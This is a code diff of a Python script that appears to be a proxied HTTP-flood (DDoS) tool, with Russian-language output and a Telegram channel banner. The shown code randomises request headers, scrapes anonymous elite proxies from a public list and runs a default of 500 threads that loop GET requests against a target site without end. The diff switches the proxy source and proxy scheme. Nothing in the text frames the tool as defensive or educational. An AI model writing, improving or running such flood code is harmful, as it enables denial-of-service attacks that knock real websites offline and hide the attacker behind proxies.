@@ -1,13 +1,12 @@
+#!/usr/bin/python3
+
 import requests, os, sys, random, re, threading
 from bs4 import BeautifulSoup
 from colorama import Fore
 
-# Можете ввести сразу сюда
-
 site = '' 
 proxy = ''
 headers_useragents, additionalHeaders = list (), list ()
-
 
 def useragent_list():
 	global headers_useragents
@@ -43,58 +42,40 @@ def initHeaders():
 				'Keep-Alive': str(random.randint(110,120)),
 				'Connection': 'keep-alive'
 				}
-
 	if additionalHeaders:
 		for header in additionalHeaders:
 			headers.update({header.split(":")[0]:header.split(":")[1]})
 	return headers
 
-
 def clear (): 
-    if os.name == 'nt': 
-        _ = os.system('cls') 
-    else: 
-        _ = os.system('clear')
+	if os.name == 'nt': 
+		_ = os.system('cls') 
+	else: 
+		_ = os.system('clear')
 
 def get_proxy (url):
-	r = requests.get (url)
+	a=requests.get(url)
 
-	soup = BeautifulSoup (r.text, 'lxml')
-	line = soup.find ('table', id = 'theProxyList').find ('tbody').find_all ('tr')	
-
-	file = open ('proxies.txt', 'w+')
-
-	for tr in line:
-		td = tr.find_all ('td')
-
-		ip = td[1].text
-		port = td[2].text
-
-		file.write ('http://' + ip + ':' + port + '\n')
+	file=open("proxies.txt", 'w+')
+	file.write(a.text)	
+	file.close()
 
 
 def send (site, proxy):
-	
 	proxies = open (proxy, 'r').read().splitlines()
 	prox = {}
-
 	for p in proxies:
 		headers = initHeaders()
-		prox['http'] = p
-
+		prox['https'] = p
 		try:
 			while True:
 				#print (site, headers, prox)
-				req = requests.get (site, headers = headers, proxies = prox)
+				requests.get (site, headers = headers, proxies = prox)
 				print (Fore.GREEN + 'Запрос на ' + site + ' Выполнен')
 		except:
 			continue
 
-
-
-
 def main ():
-
 	print ('''
 Наш телеграмчик: @Termuxtop
 ·▄▄▄▄  ▄• ▄▌·▄▄▄▄  ·▄▄▄▄        .▄▄ · 
@@ -112,7 +93,7 @@ def main ():
 		thread = 500
 
 	if proxy.strip () == '':
-		get_proxy ('http://foxtools.ru/Proxy?al=True&am=True&ah=True&ahs=True&http=True&https=False')
+		get_proxy ('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1000&country=all&anonymity=elite&ssl=yes')
 		proxy = 'proxies.txt'
 
 	thread_list = []
